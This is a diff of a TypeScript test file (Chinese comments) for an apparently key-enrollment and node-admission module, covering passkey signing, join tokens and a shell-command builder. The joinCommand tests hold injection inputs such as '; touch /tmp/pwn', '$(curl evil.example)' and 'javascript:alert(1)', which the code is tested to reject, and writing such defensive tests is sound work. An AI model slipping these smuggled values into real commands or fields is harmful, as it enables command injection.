@@ -8,7 +8,7 @@ import {
   rememberSigner,
   takeRememberedSigner,
 } from '@/auth/credential-prompt';
-import { buildAddPasskeyRecord } from '@/auth/key-log-actions';
+import { buildAddPasskeyRecord, enrollmentSignerFrom } from '@/auth/key-log-actions';
 import type { AuthenticationResponseJSON } from '@vibeterm/api-client/auth/index';
 import type { VerifyPasskeyAssertion } from '@vibeterm/shared/auth';
 import {
@@ -19,16 +19,12 @@ import {
   createEnrollment,
   createNodeCertificate,
   decodeAdmitNodePayload,
-  decodeAuthorization,
-  decodeBase64url,
   decodeCertificate,
-  decodeJoinToken,
   decodeKeyLogRecord,
   decodePasskeyAssertion,
   decodeRevokeNodePayload,
   emptyUserKeyState,
   encodeBase64url,
-  encodeJoinToken,
   generateEd25519KeyPair,
   generateKdfParams,
   genesisHead,
@@ -59,10 +55,8 @@ import {
   buildRevokeNodeRecord,
   classifyKeyLogFailure,
   clearPendingEnrollments,
-  createEnrollmentOnHub,
-  encodeJoinTokenZeroing,
   findPendingForCertificate,
-  isTrustedHubUrl,
+  isTrustedPublicUrl,
   joinCommand,
   listPendingEnrollments,
   matchPendingCertificate,
@@ -74,7 +68,6 @@ import {
   subscribePendingEnrollments,
 } from './enrollment';
 import { offerCertificate } from './enrollment-watch';
-import type { HubApi } from './hub-api';
 
 function memoryStorage(): PendingStorage & { dump(): Record<string, string> } {
   const values = new Map<string, string>();
@@ -373,150 +366,6 @@ describe('pending 存储', () => {
   });
 });
 
-describe('createEnrollmentOnHub', () => {
-  const headHash = new Uint8Array(32).fill(7);
-
-  function fakeHub(created: Record<string, string>[], extras?: { ca_fingerprint?: string }) {
-    return {
-      createEnrollment: (body: Record<string, string>) => {
-        created.push(body);
-        return Promise.resolve({
-          ok: true,
-          id: 'e-1',
-          expires_at: NOW + 60_000,
-          public_url: 'https://hub.example',
-          ca_fingerprint: extras?.ca_fingerprint,
-        });
-      },
-    } as unknown as HubApi;
-  }
-
-  test('join 串只在返回值里，pending 不含私钥，且 enroll_sk 用后即清零', async () => {
-    const created: Record<string, string>[] = [];
-    const hubApi = fakeHub(created);
-
-    const outcome = await createEnrollmentOnHub({
-      hubApi,
-      uid: UID,
-      rootEpoch: ROOT_EPOCH,
-      signer: { kind: 'root', rootKey },
-      rootPublicKey: rootKey.publicKey,
-      keyLogHeadHash: headHash,
-      name: 'studio',
-      now: NOW,
-    });
-
-    expect(outcome.joinToken).toHaveLength(128);
-    expect(outcome.hubPublicUrl).toBe('https://hub.example');
-    expect(outcome.pending.hubEnrollmentId).toBe('e-1');
-    expect(Object.keys(outcome.pending)).not.toContain('enrollSk');
-    expect(JSON.stringify(outcome.pending)).not.toContain(outcome.joinToken);
-
-    // join 串里前 32 字节就是 enroll_sk；此刻内存里的那份必须已经清零。
-    const token = decodeJoinToken(outcome.joinToken);
-    expect(token.enrollSk.some((byte) => byte !== 0)).toBe(true);
-    expect(encodeBase64url(token.rootPublicKey)).toBe(encodeBase64url(rootKey.publicKey));
-    expect(encodeBase64url(token.keyLogHeadHash)).toBe(encodeBase64url(headHash));
-    expect(created).toHaveLength(1);
-    expect(listPendingEnrollments()).toEqual([outcome.pending]);
-
-    // 根钥路径的授权签名仍是裸 64 字节 Ed25519。
-    const authorization = decodeAuthorization(decodeBase64url(outcome.pending.authorizationBytes));
-    expect(authorization.signer).toBe('root');
-    expect(authorization.credential_id).toBeNull();
-    expect(decodeBase64url(outcome.pending.authorizationSig)).toHaveLength(64);
-  });
-
-  test('hub 返回 ca_fingerprint 时 join 串带 v2 段', async () => {
-    const fingerprint = 'cd'.repeat(32);
-    const outcome = await createEnrollmentOnHub({
-      hubApi: fakeHub([], { ca_fingerprint: fingerprint }),
-      uid: UID,
-      rootEpoch: ROOT_EPOCH,
-      signer: { kind: 'root', rootKey },
-      rootPublicKey: rootKey.publicKey,
-      keyLogHeadHash: headHash,
-      now: NOW,
-    });
-    expect(decodeJoinToken(outcome.joinToken).caFingerprint).toBe(fingerprint);
-    expect(outcome.joinToken.endsWith(`.${fingerprint}`)).toBe(true);
-  });
-
-  test('passkey 签授权：signer=passkey、credential_id 落在授权里，sig 是 Borsh 断言', async () => {
-    const created: Record<string, string>[] = [];
-    const outcome = await createEnrollmentOnHub({
-      hubApi: fakeHub(created),
-      uid: UID,
-      rootEpoch: ROOT_EPOCH,
-      signer: passkeySigner,
-      rootPublicKey: rootKey.publicKey,
-      keyLogHeadHash: headHash,
-      name: 'studio',
-      now: NOW,
-    });
-
-    const authorizationBytes = decodeBase64url(outcome.pending.authorizationBytes);
-    const authorization = decodeAuthorization(authorizationBytes);
-    expect(authorization.signer).toBe('passkey');
-    expect(authorization.credential_id).toBe(CREDENTIAL_ID);
-    expect(authorization.uid).toBe(UID);
-    expect(authorization.root_epoch).toBe(ROOT_EPOCH);
-
-    // 断言字节不是 64 字节裸签名，而是 Borsh PasskeyAssertion，challenge = sha256(授权字节)。
-    const sig = decodeBase64url(outcome.pending.authorizationSig);
-    expect(sig.length).not.toBe(64);
-    expect(decodePasskeyAssertion(sig).credential_id).toBe(CREDENTIAL_ID);
-    expect(
-      verifyPasskeyAssertion({
-        recordBytes: authorizationBytes,
-        sig,
-        credentialId: CREDENTIAL_ID,
-        publicKey: passkeyPair.publicKey,
-        challenge: sha256(authorizationBytes),
-      })
-    ).toBe(true);
-
-    // 手上没有根钥也照样能拼 join 串：第二段来自 /api/auth/mode 的 rootPublicKey。
-    const token = decodeJoinToken(outcome.joinToken);
-    expect(encodeBase64url(token.rootPublicKey)).toBe(encodeBase64url(rootKey.publicKey));
-    expect(encodeBase64url(token.keyLogHeadHash)).toBe(encodeBase64url(headHash));
-    expect(created[0].authorization_sig).toBe(outcome.pending.authorizationSig);
-  });
-
-  test('断言返回的 credential 与请求的不一致时直接拒绝', async () => {
-    await expect(
-      createEnrollmentOnHub({
-        hubApi: fakeHub([]),
-        uid: UID,
-        rootEpoch: ROOT_EPOCH,
-        signer: {
-          kind: 'passkey',
-          credentialId: CREDENTIAL_ID,
-          assert: (challenge) => Promise.resolve(fakeAssert(challenge, 'other-cred')),
-        },
-        rootPublicKey: rootKey.publicKey,
-        keyLogHeadHash: headHash,
-        now: NOW,
-      })
-    ).rejects.toThrow('credential mismatch');
-  });
-
-  test('根公钥长度不对时不生成任何东西', async () => {
-    await expect(
-      createEnrollmentOnHub({
-        hubApi: fakeHub([]),
-        uid: UID,
-        rootEpoch: ROOT_EPOCH,
-        signer: { kind: 'root', rootKey },
-        rootPublicKey: new Uint8Array(16),
-        keyLogHeadHash: headHash,
-        now: NOW,
-      })
-    ).rejects.toThrow('32 bytes');
-    expect(listPendingEnrollments()).toEqual([]);
-  });
-});
-
 describe('requireRootPublicKey', () => {
   test('base64url 的 32 字节根公钥原样解出', () => {
     expect(
@@ -645,23 +494,21 @@ describe('admit-node 记录', () => {
 
   test('passkey 签的 admit-node：记录与内嵌授权都由断言验证，reducer 认下证书', async () => {
     // 授权与记录都用同一把 passkey 签（enroll 与 admit 都不需要根钥在手）。
-    const created: Record<string, string>[] = [];
-    const outcome = await createEnrollmentOnHub({
-      hubApi: {
-        createEnrollment: (body: Record<string, string>) => {
-          created.push(body);
-          return Promise.resolve({ ok: true, id: 'e-pk', expires_at: NOW + 60_000 });
-        },
-      } as unknown as HubApi,
+    const enrollment = await createEnrollment(enrollmentSignerFrom(passkeySigner), {
       uid: UID,
       rootEpoch: ROOT_EPOCH,
-      signer: passkeySigner,
-      rootPublicKey: rootKey.publicKey,
-      keyLogHeadHash: new Uint8Array(32).fill(7),
       now: NOW,
     });
-    const enrollSk = decodeJoinToken(outcome.joinToken).enrollSk;
-    const cert = makeCertificate(enrollSk, decodeBase64url(outcome.pending.enrollPk));
+    const pending: PendingEnrollment = {
+      hubEnrollmentId: 'e-pk',
+      enrollPk: encodeBase64url(enrollment.enrollPk),
+      authorizationBytes: encodeBase64url(enrollment.authorizationBytes),
+      authorizationSig: encodeBase64url(enrollment.authorizationSig),
+      exp: NOW + 60_000,
+      name: null,
+      createdAt: NOW,
+    };
+    const cert = makeCertificate(enrollment.enrollSk, enrollment.enrollPk);
 
     // 状态机先认下这把 passkey（一条根钥签的 add-passkey）。
     let state = emptyUserKeyState(rootKey.publicKey, generateKdfParams(), ROOT_EPOCH);
@@ -672,7 +519,7 @@ describe('admit-node 记录', () => {
       head: state.head,
       rootEpoch: ROOT_EPOCH,
       uid: UID,
-      pending: outcome.pending,
+      pending,
       certificateBytes: cert.certificateBytes,
       certSig: cert.certSig,
       signer: passkeySigner,
@@ -863,78 +710,40 @@ describe('凭据复用窗口', () => {
 
 describe('joinCommand', () => {
   test('带名称时加 --name，特殊字符加引号', () => {
-    expect(joinCommand('https://hub.example', 'TOKEN', 'studio')).toBe(
-      "vibeterm hub join 'https://hub.example' --token TOKEN --name studio"
+    expect(joinCommand('https://relay.example', 'TOKEN', 'studio')).toBe(
+      "vibeterm relay join 'https://relay.example' --token TOKEN --name studio"
     );
-    expect(joinCommand('https://hub.example', 'TOKEN', 'my node')).toContain("--name 'my node'");
-    expect(joinCommand('https://hub.example', 'TOKEN', null)).toBe(
-      "vibeterm hub join 'https://hub.example' --token TOKEN"
+    expect(joinCommand('https://relay.example', 'TOKEN', 'my node')).toContain("--name 'my node'");
+    expect(joinCommand('https://relay.example', 'TOKEN', null)).toBe(
+      "vibeterm relay join 'https://relay.example' --token TOKEN"
     );
   });
 
   test('URL 一律 shell 转义：合法 URL 里的 & 不会截断命令', () => {
-    const command = joinCommand('https://hub.example/x?a=1&b=2', 'TOKEN');
-    expect(command).toContain("'https://hub.example/x?a=1&b=2'");
+    const command = joinCommand('https://relay.example/x?a=1&b=2', 'TOKEN');
+    expect(command).toContain("'https://relay.example/x?a=1&b=2'");
     expect(command).not.toContain('& b');
-    // 引号之外不应再出现裸的 shell 元字符
-    expect(command.split("'")[0]).toBe('vibeterm hub join ');
+    expect(command.split("'")[0]).toBe('vibeterm relay join ');
   });
 
   test('注入型 URL 直接拒绝，不是「引起来就算了」', () => {
-    expect(() => joinCommand('https://hub.example; touch /tmp/pwn', 'TOKEN')).toThrow();
+    expect(() => joinCommand('https://relay.example; touch /tmp/pwn', 'TOKEN')).toThrow();
     expect(() => joinCommand('$(curl evil.example)', 'TOKEN')).toThrow();
-    expect(() => joinCommand('http://hub.example', 'TOKEN')).toThrow();
+    expect(() => joinCommand('http://relay.example', 'TOKEN')).toThrow();
     expect(() => joinCommand('javascript:alert(1)', 'TOKEN')).toThrow();
   });
 
-  test('isTrustedHubUrl：只认 https（回环 http 例外），拒绝带凭据的 URL', () => {
-    expect(isTrustedHubUrl('https://hub.example:8443/base')).toBe(true);
-    expect(isTrustedHubUrl('http://localhost:19663')).toBe(true);
-    expect(isTrustedHubUrl('http://127.0.0.1:9663')).toBe(true);
-    expect(isTrustedHubUrl('http://hub.example')).toBe(false);
-    expect(isTrustedHubUrl('https://user:pw@hub.example')).toBe(false);
-    expect(isTrustedHubUrl('ftp://hub.example')).toBe(false);
-    expect(isTrustedHubUrl('')).toBe(false);
-    expect(isTrustedHubUrl(null)).toBe(false);
+  test('isTrustedPublicUrl：只认 https（回环 http 例外），拒绝带凭据的 URL', () => {
+    expect(isTrustedPublicUrl('https://relay.example:8443/base')).toBe(true);
+    expect(isTrustedPublicUrl('http://localhost:19663')).toBe(true);
+    expect(isTrustedPublicUrl('http://127.0.0.1:9663')).toBe(true);
+    expect(isTrustedPublicUrl('http://relay.example')).toBe(false);
+    expect(isTrustedPublicUrl('https://user:pw@relay.example')).toBe(false);
+    expect(isTrustedPublicUrl('ftp://relay.example')).toBe(false);
+    expect(isTrustedPublicUrl('')).toBe(false);
+    expect(isTrustedPublicUrl(null)).toBe(false);
   });
 });
-
-describe('encodeJoinTokenZeroing', () => {
-  test('拼出的 96 字节缓冲用完即清零（串本身与共享编码器逐字一致）', () => {
-    const enrollSk = new Uint8Array(32).fill(7);
-    const rootPk = new Uint8Array(32).fill(8);
-    const head = new Uint8Array(32).fill(9);
-    const scratch = new Uint8Array(96).fill(1);
-    const token = encodeJoinTokenZeroing(enrollSk, rootPk, head, undefined, scratch);
-
-    expect(token).toBe(encodeJoinToken(enrollSk, rootPk, head));
-    expect(decodeJoinToken(token).enrollSk).toEqual(enrollSk);
-    // 私钥的字节副本不能留在堆里
-    expect(scratch.every((byte) => byte === 0)).toBe(true);
-  });
-
-  test('可选 CA fingerprint 段与共享编码器一致，缓冲仍清零', () => {
-    const enrollSk = new Uint8Array(32).fill(7);
-    const rootPk = new Uint8Array(32).fill(8);
-    const head = new Uint8Array(32).fill(9);
-    const fingerprint = 'ab'.repeat(32);
-    const scratch = new Uint8Array(96).fill(1);
-    const token = encodeJoinTokenZeroing(enrollSk, rootPk, head, fingerprint, scratch);
-    expect(token).toBe(encodeJoinToken(enrollSk, rootPk, head, fingerprint));
-    expect(decodeJoinToken(token).caFingerprint).toBe(fingerprint);
-    expect(scratch.every((byte) => byte === 0)).toBe(true);
-  });
-
-  test('长度不对直接抛，不产出半截串', () => {
-    expect(() =>
-      encodeJoinTokenZeroing(new Uint8Array(31), new Uint8Array(32), new Uint8Array(32))
-    ).toThrow();
-  });
-});
-
-// ---------------------------------------------------------------------------
-// hub=sync 的失败处理（B2-6）：未确认 = 本地什么都没写，重试必须原样重发同一份字节
-// ---------------------------------------------------------------------------
 
 describe('hub=sync 失败分类', () => {
   test('超时 / hub 不可达 = 未确认（本地未落库，可原样重试）', () => {
@@ -953,11 +762,10 @@ describe('hub=sync 失败分类', () => {
     expect(classifyKeyLogFailure('KEY_LOG_REJECTED')).toBe('rejected');
   });
 
-  test('只有 hubAck === true 才算确认', () => {
+  test('hubAck === false 才算未确认；缺失与 true 都算本机已落库', () => {
     expect(admitDisposition({ ok: true, hubAck: true })).toEqual({ kind: 'admitted' });
-    // 旧版 entry 可能仍返回 200 + hubAck:false / 不带该字段
     expect(admitDisposition({ ok: true, hubAck: false })).toEqual({ kind: 'unconfirmed' });
-    expect(admitDisposition({ ok: true })).toEqual({ kind: 'unconfirmed' });
+    expect(admitDisposition({ ok: true })).toEqual({ kind: 'admitted' });
     expect(admitDisposition({ ok: false, code: 'HUB_TIMEOUT' })).toEqual({ kind: 'unconfirmed' });
     expect(admitDisposition({ ok: false, code: 'seq_gap' })).toEqual({ kind: 'stale' });
     expect(admitDisposition({ ok: false, code: 'BAD_SIGNATURE' })).toEqual({
